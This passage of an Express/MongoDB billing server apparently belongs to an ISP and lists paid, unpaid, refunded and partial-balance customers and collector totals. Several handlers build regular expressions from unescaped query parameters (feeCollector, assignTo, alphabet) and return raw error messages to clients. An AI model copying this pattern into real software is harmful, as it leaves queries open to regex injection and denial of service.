    const feeCollectorTrimmed = feeCollector ? feeCollector.trim() : null;
    if (feeCollectorTrimmed) {
      // Use receivedBy filtering (already done in usersWithPaidMonths above)
      // This ensures employee sees users whose payments they actually received
      console.log(`🔒 Filtering /api/users/paid by receivedBy: ${feeCollectorTrimmed} (for paid users list)`);
      console.log(`💰 Income calculation uses receivedBy (already filtered above)`);
      console.log(`📋 Users with payments received by ${feeCollectorTrimmed}: ${usersWithPaidMonths.length}`);
    }

    // STRICT: Filter by assignTo (technician) if provided (case-insensitive) - ALWAYS apply
    if (assignTo) {
      const assignToTrimmed = assignTo.trim();
      if (assignToTrimmed) {
        query.$and.push({ assignTo: { $regex: new RegExp(`^${assignToTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } });
        console.log(`🔒 STRICT: Filtering /api/users/paid by assignTo (technician, case-insensitive): ${assignToTrimmed}`);
      }
    }

    // Search filter - search in userName, userId, simNo, whatsappNo, streetName
    if (search && search.trim()) {
      const searchTrimmed = search.trim();
      const searchRegex = new RegExp(searchTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i');
      query.$and.push({
        $or: [
          { userName: { $regex: searchRegex } },
          { userId: { $regex: searchRegex } },
          { simNo: { $regex: searchRegex } },
          { whatsappNo: { $regex: searchRegex } },
          { streetName: { $regex: searchRegex } }
        ]
      });
      console.log(`🔍 Search filter applied: "${searchTrimmed}"`);
    }

    // Add user ID filter if we have users with paid months
    if ((paymentDate || (fromDate && toDate)) && userIds.length > 0) {
      const objectIds = userIds.map(id => new ObjectId(id));
      query.$and.push({ _id: { $in: objectIds } });
      console.log(`🔍 Filtering users with IDs:`, objectIds.map(id => id.toString()));
    } else if ((paymentDate || (fromDate && toDate)) && userIds.length === 0) {
      // No users found for this payment date/range
      return res.status(200).json({
        success: true,
        data: [],
        totalCount: 0,
        page,
        limit
      });
    } else if (!paymentDate && !fromDate && !toDate && usersWithPaidMonths.length > 0) {
      // No date filter - filter by users with paid months (already filtered by receivedBy if feeCollector provided)
      const objectIds = usersWithPaidMonths.map(id => {
        try {
          return new ObjectId(id);
        } catch (e) {
          return id;
        }
      });
      query.$and.push({ _id: { $in: objectIds } });
      console.log(`🔍 Filtering by users with paid months: ${objectIds.length} users`);
    } else if (!paymentDate && !fromDate && !toDate && usersWithPaidMonths.length === 0) {
      // No users with paid months from vouchers - return empty
      console.log('📋 No users found with paid months matching the filter criteria');
      return res.status(200).json({
        success: true,
        data: [],
        totalCount: 0,
        totalCollectionAmount, // Return 0 collection if no users
        page,
        limit
      });
    }

    // CRITICAL: Exclude users expiring TODAY or TOMORROW (expiring soon users)
    // These users should only show in Expiring Soon tab, not in Paid/Unpaid tabs
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
    const todayY = nowInPKT.getUTCFullYear();
    const todayM = nowInPKT.getUTCMonth();
    const todayD = nowInPKT.getUTCDate();

    // Calculate tomorrow's date
    const tomorrowDate = new Date(Date.UTC(todayY, todayM, todayD + 1));
    const tomorrowY = tomorrowDate.getUTCFullYear();
    const tomorrowM = tomorrowDate.getUTCMonth();
    const tomorrowD = tomorrowDate.getUTCDate();

    // Exclude users with showInExpiringSoon flag (cron job marks users expiring today/tomorrow)
    query.$and.push({
      $or: [
        { showInExpiringSoon: { $ne: true } },
        { showInExpiringSoon: { $exists: false } }
      ]
    });

    console.log(`🚫 Excluding users with showInExpiringSoon flag from Paid Users list`);

    const totalCount = await usersCollection.countDocuments(query);
    const users = await usersCollection
      .find(query)
      .sort({ userName: 1 })
      .skip((page - 1) * limit)
      .limit(limit)
      .toArray();

    console.log(`Paid users: ${users.length} found, ${totalCount} total`);

    res.status(200).json({
      success: true,
      data: users,
      totalCount,
      totalCollectionAmount, // Total collection for date range filter
      page,
      limit
    });
  } catch (error) {
    console.error('Error fetching paid users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching paid users',
      error: error.message
    });
  }
});

// GET my collection - Returns specific payments made by a collector with accurate dates
app.get('/api/collections/my-collection', async (req, res) => {
  try {
    const vouchersCollection = db.collection('vouchers');
    const usersCollection = db.collection('users');
    const { fromDate, toDate, collector } = req.query;

    if (!collector) {
      return res.status(400).json({
        success: false,
        message: 'Collector name is required'
      });
    }

    if (!fromDate || !toDate) {
      return res.status(400).json({
        success: false,
        message: 'Date range (fromDate and toDate) is required'
      });
    }

    console.log(`📊 Fetching My Collection for "${collector}" from ${fromDate} to ${toDate}`);

    const collectorTrimmed = collector.trim();
    const collectorRegex = new RegExp(`^${collectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');

    // STRICT: No backward compatibility for "Myself" - only match explicit receivedBy
    // Admin should only see payments where receivedBy is explicitly "admin" or "Admin"
    const shouldMatchMyself = false;
    console.log(`🔒 STRICT mode: Only matching explicit receivedBy "${collectorTrimmed}"`);

    // Get all vouchers with paid/partial months
    const vouchers = await vouchersCollection.find({
      'months.status': { $in: ['paid', 'partial'] }
    }).toArray();

    console.log(`🔍 Total vouchers with paid/partial months: ${vouchers.length}`);

    const collections = [];
    let totalAmount = 0;
    let skippedCount = 0;
    let matchedMonthsCount = 0;

    // Get all users for mapping
    const allUsers = await usersCollection.find({}).toArray();
    const userMap = new Map();
    allUsers.forEach(user => {
      userMap.set(user._id.toString(), user);
    });

    for (const voucher of vouchers) {
      const months = Array.isArray(voucher.months) ? voucher.months : [];
      const user = userMap.get(voucher.userId?.toString());
      const userName = user?.userName || 'Unknown User';

      for (const month of months) {
        if (!['paid', 'partial'].includes(month.status)) continue;

        matchedMonthsCount++;

        // Normalize date helper
        const normalizeDate = (dateValue) => {
          if (!dateValue) return null;
          try {
            const d = new Date(dateValue);
            // Convert to Pakistan time YYYY-MM-DD
            const pktDate = new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Karachi' }).format(d);
            return pktDate;
          } catch (e) {
            if (typeof dateValue === 'string' && dateValue.includes('T')) {
              return dateValue.split('T')[0];
            }
            return null;
          }
        };

        // Check paymentHistory FIRST (more specific and accurate)
        const paymentHistory = Array.isArray(month.paymentHistory) ? month.paymentHistory : [];
        let addedFromHistory = false;

        for (const payment of paymentHistory) {
          const histReceivedBy = payment.receivedBy || '';
          // STRICT: Only match explicit collector name, never "Myself"
          const histMatchesCollector = collectorRegex.test(histReceivedBy) &&
            histReceivedBy.toLowerCase() !== 'myself';

          if (histMatchesCollector && payment.date && payment.amount) {
            const dateStr = normalizeDate(payment.date);

            // Check if date is in range
            if (dateStr && dateStr >= fromDate && dateStr <= toDate) {
              collections.push({
                userName,
                amount: payment.amount || 0,
                date: dateStr,
                month: month.month,
                receivedBy: histReceivedBy
              });
              totalAmount += payment.amount || 0;
              addedFromHistory = true;

              if (collections.length <= 3) {
                console.log(`✅ Added from history: ${userName} - ${month.month} - Rs ${payment.amount} - ${dateStr} - receivedBy: ${histReceivedBy}`);
              }
            } else {
              if (skippedCount < 3) {
                console.log(`⏭️ Skipped (date out of range): ${userName} - ${dateStr} not in ${fromDate} to ${toDate}`);
                skippedCount++;
              }
            }
          } else if (histMatchesCollector) {
            if (skippedCount < 3) {
              console.log(`⏭️ Skipped (missing data): ${userName} - date: ${payment.date ? 'yes' : 'no'}, amount: ${payment.amount ? 'yes' : 'no'}`);
              skippedCount++;
            }
          }
        }

        // Only check month.receivedBy if NOT already added from paymentHistory
        // This avoids duplicate entries for the same payment
        if (!addedFromHistory) {
          const monthReceivedBy = month.receivedBy || '';
          // STRICT: Only match explicit collector name, never "Myself"
          const monthMatchesCollector = collectorRegex.test(monthReceivedBy) &&
            monthReceivedBy.toLowerCase() !== 'myself';

          if (monthMatchesCollector) {
            // Get payment date from month
            const paymentDate = month.createdAt || month.date;
            const dateStr = normalizeDate(paymentDate);

            // Check if date is in range
            if (dateStr && dateStr >= fromDate && dateStr <= toDate) {
              collections.push({
                userName,
                amount: month.paidAmount || 0,
                date: dateStr,
                month: month.month,
                receivedBy: monthReceivedBy
              });
              totalAmount += month.paidAmount || 0;

              if (collections.length <= 3) {
                console.log(`✅ Added from month: ${userName} - ${month.month} - Rs ${month.paidAmount} - ${dateStr} - receivedBy: ${monthReceivedBy}`);
              }
            } else {
              if (skippedCount < 3) {
                console.log(`⏭️ Skipped (date out of range): ${userName} - ${dateStr} not in ${fromDate} to ${toDate}`);
                skippedCount++;
              }
            }
          } else if (monthReceivedBy && !monthMatchesCollector) {
            if (skippedCount < 3) {
              console.log(`⏭️ Skipped (receivedBy mismatch): ${userName} - receivedBy: "${monthReceivedBy}" != "${collectorTrimmed}"`);
              skippedCount++;
            }
          }
        }
      }
    }

    // Sort by date (most recent first)
    collections.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());

    console.log(`\n📊 My Collection Summary:`);
    console.log(`   Collector: "${collectorTrimmed}"`);
    console.log(`   Date Range: ${fromDate} to ${toDate}`);
    console.log(`   Total vouchers checked: ${vouchers.length}`);
    console.log(`   Total paid/partial months: ${matchedMonthsCount}`);
    console.log(`   ✅ Payments found: ${collections.length}`);
    console.log(`   💰 Total Amount: Rs ${totalAmount}`);
    console.log(`   ⏭️ Items skipped: ${skippedCount}+\n`);

    res.status(200).json({
      success: true,
      data: collections,
      totalAmount,
      count: collections.length
    });
  } catch (error) {
    console.error('Error fetching my collection:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching collection',
      error: error.message
    });
  }
});

// GET unpaid users (with date filter and pagination)
app.get('/api/users/unpaid', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const vouchersCollection = db.collection('vouchers');
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const expiryDate = req.query.expiryDate; // YYYY-MM-DD format
    const unpaidDate = req.query.unpaidDate; // YYYY-MM-DD format - date user became unpaid
    const rechargeDate = req.query.rechargeDate; // YYYY-MM-DD format - for filtering by recharge date
    const updatedDate = req.query.updatedDate; // YYYY-MM-DD - filter by voucher update time
    const feeCollector = req.query.feeCollector; // Fee collector name filter
    const assignTo = req.query.assignTo; // Technician assignment filter
    const search = req.query.search; // Search by name, phone, userId
    const alphabet = req.query.alphabet; // A-Z filter letter

    // CRITICAL: Query users directly by status='unpaid' or 'partial'
    // This includes Pay Later users with future expiry dates immediately
    // We exclude only expiring soon users (those expiring today/tomorrow)

    console.log(`📊 Fetching unpaid users by status (including future expiry dates)`);

    // 🔍 Find users who have at least one 'unpaid' month in their vouchers
    // This allows show them in Unpaid list even if their overall status is 'partial'
    const vouchersWithUnpaid = await vouchersCollection.find({
      'months.status': 'unpaid'
    }).project({ userId: 1 }).toArray();
    const userIdsWithUnpaidMonths = vouchersWithUnpaid.map(v => v.userId.toString());

    // Base query - active users with unpaid or partial status
    let query = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        {
          $or: [
            { status: 'unpaid' },
            {
              $and: [
                { status: 'partial' },
                {
                  _id: {
                    $in: userIdsWithUnpaidMonths.map(id => {
                      try { return new ObjectId(id); } catch (e) { return id; }
                    })
                  }
                }
              ]
            }
          ]
        }
      ]
    };

    // STRICT: Filter by fee collector if provided (case-insensitive) - ALWAYS apply
    // EMPLOYEE FILTER FIX: If both feeCollector and assignTo have the same value,
    // use OR logic instead of AND to find users assigned through either field
    if (feeCollector && assignTo && feeCollector.trim() === assignTo.trim()) {
      const employeeName = feeCollector.trim();
      query.$and.push({
        $or: [
          { feeCollector: { $regex: new RegExp(`^${employeeName}$`, 'i') } },
          { assignTo: { $regex: new RegExp(`^${employeeName}$`, 'i') } }
        ]
      });
      console.log(`🔒 EMPLOYEE FILTER: Searching for users with feeCollector OR assignTo = "${employeeName}"`);
    } else {
      // Normal separate filtering
      if (feeCollector) {
        const feeCollectorTrimmed = feeCollector.trim();
        if (feeCollectorTrimmed) {
          query.$and.push({ feeCollector: { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') } });
          console.log(`🔒 STRICT: Filtering /api/users/unpaid by fee collector (case-insensitive): ${feeCollectorTrimmed}`);
        }
      }

      // STRICT: Filter by assignTo (technician) if provided (case-insensitive) - ALWAYS apply
      if (assignTo) {
        const assignToTrimmed = assignTo.trim();
        if (assignToTrimmed) {
          query.$and.push({ assignTo: { $regex: new RegExp(`^${assignToTrimmed}$`, 'i') } });
          console.log(`🔒 STRICT: Filtering /api/users/unpaid by assignTo (technician, case-insensitive): ${assignToTrimmed}`);
        }
      }
    }

    // Search filter - search by userName, simNo, whatsappNo, userId, streetName
    if (search || alphabet) {
      const searchTrimmed = (search || '').trim();
      const alphabetLetter = (alphabet || '').trim();

      if (alphabetLetter) {
        const alphabetRegex = new RegExp(`^${alphabetLetter}`, 'i');
        query.$and.push({ userName: alphabetRegex });
        console.log(`🔤 Filtering unpaid users by alphabet: "${alphabetLetter}"`);
      } else if (searchTrimmed) {
        const searchRegex = new RegExp(searchTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i');
        query.$and.push({
          $or: [
            { userName: searchRegex },
            { simNo: searchRegex },
            { whatsappNo: searchRegex },
            { userId: searchRegex },
            { streetName: searchRegex }
          ]
        });
        console.log(`🔍 Searching unpaid users by: "${searchTrimmed}"`);
      }
    }



    // If updatedDate filter is provided, match users whose vouchers were updated on that day
    if (updatedDate) {
      console.log(`📅 Updated Date filter: ${updatedDate}`);

      // Calculate start and end of the day in PKT (UTC+5)
      // Since server might not be in PKT, we construct dates carefully
      // We assume updatedDate string is YYYY-MM-DD
      const startOfDay = new Date(`${updatedDate}T00:00:00+05:00`);
      const endOfDay = new Date(`${updatedDate}T23:59:59.999+05:00`);

      console.log(`📅 Querying vouchers updated between ${startOfDay.toISOString()} and ${endOfDay.toISOString()}`);

      // Find vouchers updated in this range
      const vouchersUpdated = await vouchersCollection.find({
        updatedAt: { $gte: startOfDay, $lte: endOfDay }
      }).project({ userId: 1 }).toArray();

      const userIds = vouchersUpdated.map(v => {
        try {
          return new ObjectId(v.userId);
        } catch (e) {
          console.error(`⚠️ Invalid userId in voucher: ${v.userId}`);
          return null;
        }
      }).filter(id => id !== null);

      if (userIds.length > 0) {
        query.$and.push({ _id: { $in: userIds } });
        console.log(`🔍 Found ${userIds.length} users updated on ${updatedDate}`);
      } else {
        // No updates found - force empty result
        query.$and.push({ _id: { $in: [] } });
        console.log(`🔍 No users found updated on ${updatedDate}`);
      }
    }

    // If rechargeDate filter is provided, match users with this recharge date
    if (rechargeDate) {
      const parts = String(rechargeDate).split(/[-\/]/);
      if (parts.length === 3) {
        const [dPart, mPart, yPart] = parts;
        const dateWithHyphen = `${dPart}-${mPart}-${yPart}`;
        const dateWithSlash = `${dPart}/${mPart}/${yPart}`;
        const isoFormat = rechargeDate; // YYYY-MM-DD
        console.log(`📅 Recharge Date filter: ${rechargeDate} → formats: ${dateWithHyphen}, ${dateWithSlash}, ${isoFormat}`);

        query.$and.push({
          rechargeDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] }
        });
        console.log(`🔍 Unpaid Query with rechargeDate filter applied`);
      }
    }

    // If unpaidDate filter is provided, match users who BECAME unpaid on that calendar day
    if (unpaidDate) {
      const parts = String(unpaidDate).split(/[-\/]/);
      if (parts.length === 3) {
        let [dayVal, monthVal, yearVal] = parts;
        // If first part is YYYY, it's ISO format YYYY-MM-DD, swap it to DD-MM-YYYY
        if (dayVal.length === 4) { [yearVal, monthVal, dayVal] = [dayVal, monthVal, yearVal]; }

        const year = parseInt(yearVal, 10);
        const month = parseInt(monthVal, 10) - 1; // JS Date month is 0-indexed
        const day = parseInt(dayVal, 10);

        if (!Number.isNaN(year) && !Number.isNaN(month) && !Number.isNaN(day)) {
          // Match strictly by Asia/Karachi local calendar day
          const formatLocalYMD = (date) => {
            try {
              return new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Karachi' }).format(date);
            } catch (err) {
              return date.toISOString().split('T')[0];
            }
          };
          const normalizeToLocalYMD = (value) => {
            if (!value) return null;
            if (value instanceof Date) return formatLocalYMD(value);
            if (typeof value === 'string') {
              const str = value.trim();
              if (/^\d{4}-\d{2}-\d{2}$/.test(str)) return str;
              const parts = str.split(/[-\/]/);
              if (parts.length === 3) {
                let [a, b, c] = parts;
                if (a.length === 4) return `${a}-${b.padStart(2, '0')}-${c.padStart(2, '0')}`;
                // Convert DD-MM-YYYY or DD/MM/YYYY to YYYY-MM-DD
                return `${c}-${b.padStart(2, '0')}-${a.padStart(2, '0')}`;
              }
            }
            return null;
          };
          const matchesTargetDate = (value) => {
            const local = normalizeToLocalYMD(value);
            return local === unpaidDate;
          };

          // First, try to match by users.unpaidSince (most reliable going forward)
          const unpaidSinceCandidates = await usersCollection.find({
            status: 'unpaid',
            $or: [
              { serviceStatus: { $ne: 'inactive' } },
              { serviceStatus: { $exists: false } }
            ],
            unpaidSince: { $exists: true }
          }).project({ _id: 1, unpaidSince: 1 }).toArray();

          const idsByUnpaidSince = unpaidSinceCandidates
            .filter(u => matchesTargetDate(u.unpaidSince))
            .map(u => u._id);

          if (idsByUnpaidSince.length > 0) {
            // CRITICAL: Add _id filter to $and array to combine with feeCollector/assignTo filters
            query.$and.push({ _id: { $in: idsByUnpaidSince } });
            console.log(`🔍 Unpaid users by unpaidSince=${unpaidDate}: ${idsByUnpaidSince.length}`);
          } else {
            // Fallback for older records: look at voucher months CREATED that day with unpaid status
            const vouchers = await vouchersCollection.find({ 'months.status': 'unpaid' }).toArray();
            const filtered = vouchers.filter((voucher) => {
              const months = Array.isArray(voucher.months) ? voucher.months : [];
              const unpaidMonths = months.filter(m => m && m.status === 'unpaid' && m.createdAt);
              if (unpaidMonths.length === 0) return false;
              // Find earliest createdAt among unpaid months
              const earliest = unpaidMonths.reduce((min, m) => {
                const d = new Date(m.createdAt);
                return (!min || d < min) ? d : min;
              }, null);
              return earliest ? matchesTargetDate(earliest) : false;
            });
            const userIds = filtered.map(v => v.userId);
            if (userIds.length === 0) {
              return res.status(200).json({ success: true, data: [], totalCount: 0, page, limit });
            }
            const objectIds = userIds.map(id => new ObjectId(id));
            // CRITICAL: Add _id filter to $and array to combine with feeCollector/assignTo filters
            query.$and.push({ _id: { $in: objectIds } });
            console.log(`🔍 Unpaid users by vouchers for unpaidDate=${unpaidDate}: ${userIds.length}`);
          }
        }
      }
    } else if (expiryDate) {
      const parts = String(expiryDate).split(/[-\/]/);
      if (parts.length === 3) {
        let [dPart, mPart, yPart] = parts;
        // If first part is YYYY, it's ISO, swap back to get day/month/year
        if (dPart.length === 4) { [yPart, mPart, dPart] = [dPart, mPart, yPart]; }

        const dateWithHyphen = `${dPart.padStart(2, '0')}-${mPart.padStart(2, '0')}-${yPart}`;
        const dateWithSlash = `${dPart.padStart(2, '0')}/${mPart.padStart(2, '0')}/${yPart}`;
        const isoFormat = expiryDate; // YYYY-MM-DD
        console.log(`📅 Date filter: ${expiryDate} → formats: ${dateWithHyphen}, ${dateWithSlash}, ${isoFormat}`);

        // Find vouchers with matching expiry date
        const vouchers = await vouchersCollection.find({
          expiryDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] }
        }).toArray();

        const userIdsFromVouchers = vouchers.map(v => v.userId);
        console.log(`📋 Found ${userIdsFromVouchers.length} vouchers with expiry date ${expiryDate}`);

        // Also check users collection for expiryDate field directly
        // This handles users who have expiryDate stored directly in their document
        if (userIdsFromVouchers.length > 0) {
          query.$and.push({
            $or: [
              { _id: { $in: userIdsFromVouchers.map(id => new ObjectId(id)) } },
              { expiryDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] } }
            ]
          });
        } else {
          // No vouchers found, but check users collection directly
          query.$and.push({
            expiryDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] }
          });
        }

        console.log(`🔍 Unpaid Query with date filter:`, JSON.stringify(query, null, 2));
      }
    }

    // CRITICAL: Exclude users expiring TODAY or TOMORROW (expiring soon users)
    // These users should only show in Expiring Soon tab, not in Paid/Unpaid tabs
    query.$and.push({
      $or: [
        { showInExpiringSoon: { $ne: true } },
        { showInExpiringSoon: { $exists: false } }
      ]
    });

    console.log(`🚫 Excluding users with showInExpiringSoon flag from Unpaid Users list`);

    // Log final query for debugging
    console.log(`🔍 Final Unpaid Query:`, JSON.stringify(query, null, 2));
    console.log(`🔍 Query params - feeCollector: ${feeCollector || 'none'}, assignTo: ${assignTo || 'none'}`);

    const totalCount = await usersCollection.countDocuments(query);
    const users = await usersCollection
      .find(query)
      .sort({ userName: 1 })
      .skip((page - 1) * limit)
      .limit(limit)
      .toArray();

    // CRITICAL: Enrich users with voucher data (outstandingMonths, pendingMonths, etc.)
    // Frontend needs this to calculate and display outstanding amounts
    const userIds = users.map(u => u._id.toString());
    const userVouchers = await vouchersCollection.find({
      userId: { $in: userIds }
    }).toArray();

    // Create a map of userId -> voucher data
    const voucherMap = new Map();
    userVouchers.forEach(voucher => {
      const userId = voucher.userId.toString();
      voucherMap.set(userId, voucher);
    });

    // Enrich each user with voucher data
    const enrichedUsers = users.map(user => {
      const voucher = voucherMap.get(user._id.toString());
      if (voucher && Array.isArray(voucher.months)) {
        // Extract unpaid months (outstandingMonths)
        const outstandingMonths = voucher.months
          .filter(m => m.status === 'unpaid')
          .map(m => m.month || m.name);

        // Extract pending months
        const pendingMonths = voucher.months
          .filter(m => m.status === 'pending' && !m.refundDate && !m.refundedAmount)
          .map(m => m.month || m.name);

        // Extract partial months (for balance calculation)
        const partialMonths = voucher.months
          .filter(m => m.status === 'partial')
          .map(m => ({
            month: m.month || m.name,
            remainingAmount: m.remainingAmount || 0
          }));

        return {
          ...user,
          outstandingMonths: outstandingMonths.length > 0 ? outstandingMonths : undefined,
          pendingMonths: pendingMonths.length > 0 ? pendingMonths : undefined,
          partialMonths: partialMonths.length > 0 ? partialMonths : undefined
        };
      }

      // For users without vouchers (e.g., new Pay Later users)
      // Frontend will use their amount field to display outstanding
      console.log(`⚠️ No voucher found for user ${user.userName} (${user._id}), using amount field for outstanding`);
      return user;
    });

    const finalFilteredUsers = enrichedUsers;

    console.log(`Unpaid users: ${finalFilteredUsers.length} found, ${totalCount} total (enriched with voucher data)`);
    if (feeCollector || assignTo) {
      console.log(`🔒 Filtered users - feeCollector: ${feeCollector || 'none'}, assignTo: ${assignTo || 'none'}`);
      finalFilteredUsers.forEach(u => {
        console.log(`  - ${u.userName}: feeCollector=${u.feeCollector || 'none'}, assignTo=${u.assignTo || 'none'}`);
      });
    }

    res.status(200).json({
      success: true,
      data: finalFilteredUsers,
      totalCount: finalFilteredUsers.length < users.length ? totalCount - (users.length - finalFilteredUsers.length) : totalCount,
      page,
      limit
    });
  } catch (error) {
    console.error('Error fetching unpaid users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching unpaid users',
      error: error.message
    });
  }
});

// GET reversed users (refunded months) - FROM REFUNDS COLLECTION
app.get('/api/users/reversed', async (req, res) => {
  try {
    const refundsCollection = db.collection('refunds');
    const usersCollection = db.collection('users');
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const expiryDate = req.query.expiryDate; // YYYY-MM-DD format
    const feeCollector = req.query.feeCollector; // Fee collector name filter
    const assignTo = req.query.assignTo; // Technician assignment filter

    console.log('🔄 Fetching reversed (refunded) users from REFUNDS collection...');

    // Find all refunds
    let refundQuery = {};

    // Apply expiry date filter if provided (optional - refunds don't have expiry date)
    // This filter is kept for API compatibility but may not be used
    if (expiryDate) {
      console.log(`Date filter: ${expiryDate} (not applied to refunds collection)`);
    }

    const allRefunds = await refundsCollection.find(refundQuery).toArray();
    console.log(`📋 Found ${allRefunds.length} refund records`);

    if (allRefunds.length === 0) {
      return res.status(200).json({
        success: true,
        data: [],
        totalCount: 0,
        page,
        limit
      });
    }

    // Get unique user IDs from refunds
    const userIds = [...new Set(allRefunds.map(r => r.userId))];
    console.log(`👥 Unique users with refunds: ${userIds.length}`);

    // Build user query with filters
    let userQuery = {
      _id: { $in: userIds.map(id => new ObjectId(id)) },
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        }
      ]
    };

    // STRICT: Filter by fee collector if provided (case-insensitive) - ALWAYS apply
    if (feeCollector) {
      const feeCollectorTrimmed = feeCollector.trim();
      if (feeCollectorTrimmed) {
        userQuery.$and.push({ feeCollector: { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') } });
        console.log(`🔒 STRICT: Filtering /api/users/reversed by fee collector (case-insensitive): ${feeCollectorTrimmed}`);
      }
    }

    // STRICT: Filter by assignTo (technician) if provided (case-insensitive) - ALWAYS apply
    if (assignTo) {
      const assignToTrimmed = assignTo.trim();
      if (assignToTrimmed) {
        userQuery.$and.push({ assignTo: { $regex: new RegExp(`^${assignToTrimmed}$`, 'i') } });
        console.log(`🔒 STRICT: Filtering /api/users/reversed by assignTo (technician, case-insensitive): ${assignToTrimmed}`);
      }
    }

    // First, get all matching users to calculate totalCount
    const allMatchingUsers = await usersCollection.find(userQuery).toArray();
    const totalCount = allMatchingUsers.length;

    // Then apply pagination
    const paginatedUserIds = allMatchingUsers
      .slice((page - 1) * limit, page * limit)
      .map(u => u._id);

    const users = await usersCollection.find({
      _id: { $in: paginatedUserIds }
    }).toArray();

    // Add filterType and calculate reversed amount for each user
    const usersWithReversedData = users.map(user => {
      const userRefunds = allRefunds.filter(r => r.userId === user._id.toString());
      let reversedAmount = 0;

      // Calculate total refunded amount from all refund records
      userRefunds.forEach(refund => {
        if (refund.refundedMonths && Array.isArray(refund.refundedMonths)) {
          refund.refundedMonths.forEach(month => {
            // Use refundedAmount which is (paidAmount + remainingAmount)
            reversedAmount += Number(month.refundedAmount || 0);
          });
        }
      });

      console.log(`💰 User ${user.userName}: Total refunded = Rs ${reversedAmount}`);

      return {
        ...user,
        filterType: 'reversed',
        amount: reversedAmount,
        remainingAmount: reversedAmount
      };
    });

    console.log(`✅ Returning ${usersWithReversedData.length} reversed users for page ${page}`);

    res.status(200).json({
      success: true,
      data: usersWithReversedData,
      totalCount,
      page,
      limit
    });
  } catch (error) {
    console.error('❌ Error fetching reversed users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching reversed users',
      error: error.message
    });
  }
});

// GET balance users (partial payment users with date filter and pagination)
app.get('/api/balances', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const vouchersCollection = db.collection('vouchers');
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const expiryDate = req.query.expiryDate; // YYYY-MM-DD format
    const updatedDate = req.query.updatedDate; // YYYY-MM-DD - filter by voucher update time
    const feeCollector = req.query.feeCollector; // Fee collector name filter
    const assignTo = req.query.assignTo; // Technician assignment filter
    const search = req.query.search; // Search by name, phone, userId
    const alphabet = req.query.alphabet; // A-Z filter letter

    // 🔍 Find users who have at least one 'partial' (balanced) month in their vouchers
    // This allows show them in Balance list even if their overall status is 'unpaid'
    const vouchersWithPartial = await vouchersCollection.find({
      'months.status': 'partial'
    }).project({ userId: 1 }).toArray();
    const userIdsWithPartialMonths = vouchersWithPartial.map(v => v.userId.toString());

    // Base query - include users with status 'partial' OR 'superbalance'
    // 'partial' = normal partial payment
    // 'superbalance' = advance payment (all months balance button clicked)
    let query = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        // CRITICAL: Show users with 'partial' OR 'superbalance' status
        // AND include 'unpaid' users who have at least one partial month
        {
          $or: [
            { status: 'partial', remainingAmount: { $gt: 0 } },
            { status: 'superbalance' },
            {
              $and: [
                { status: 'unpaid' },
                {
                  _id: {
                    $in: userIdsWithPartialMonths.map(id => {
                      try { return new ObjectId(id); } catch (e) { return id; }
                    })
                  }
                }
              ]
            }
          ]
        }
      ]
    };

    console.log(`📊 Balance query: Fetching users with status='partial' OR 'superbalance'`);

    // If updatedDate filter is provided, match users whose vouchers were updated on that day
    if (updatedDate) {
      console.log(`📅 Updated Date filter: ${updatedDate}`);

      // Calculate start and end of the day in PKT (UTC+5)
      const startOfDay = new Date(`${updatedDate}T00:00:00+05:00`);
      const endOfDay = new Date(`${updatedDate}T23:59:59.999+05:00`);

      console.log(`📅 Querying vouchers updated between ${startOfDay.toISOString()} and ${endOfDay.toISOString()}`);

      // Find vouchers updated in this range
      const vouchersUpdated = await vouchersCollection.find({
        updatedAt: { $gte: startOfDay, $lte: endOfDay }
      }).project({ userId: 1 }).toArray();

      const userIds = vouchersUpdated.map(v => new ObjectId(v.userId));

      if (userIds.length > 0) {
        query.$and.push({ _id: { $in: userIds } });
        console.log(`🔍 Found ${userIds.length} users updated on ${updatedDate}`);
      } else {
        // No updates found - force empty result
        query.$and.push({ _id: { $in: [] } });
        console.log(`🔍 No users found updated on ${updatedDate}`);
      }
    }

    // STRICT: Filter by fee collector if provided (case-insensitive) - ALWAYS apply
    // EMPLOYEE FILTER FIX: If both feeCollector and assignTo have the same value,
    // use OR logic instead of AND to find users assigned through either field
    if (feeCollector && assignTo && feeCollector.trim() === assignTo.trim()) {
      const employeeName = feeCollector.trim();
      query.$and.push({
        $or: [
          { feeCollector: { $regex: new RegExp(`^${employeeName}$`, 'i') } },
          { assignTo: { $regex: new RegExp(`^${employeeName}$`, 'i') } }
        ]
      });
      console.log(`🔒 EMPLOYEE FILTER: Searching for balance users with feeCollector OR assignTo = "${employeeName}"`);
    } else {
      // Normal separate filtering
      if (feeCollector) {
        const feeCollectorTrimmed = feeCollector.trim();
        if (feeCollectorTrimmed) {
          query.$and.push({ feeCollector: { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') } });
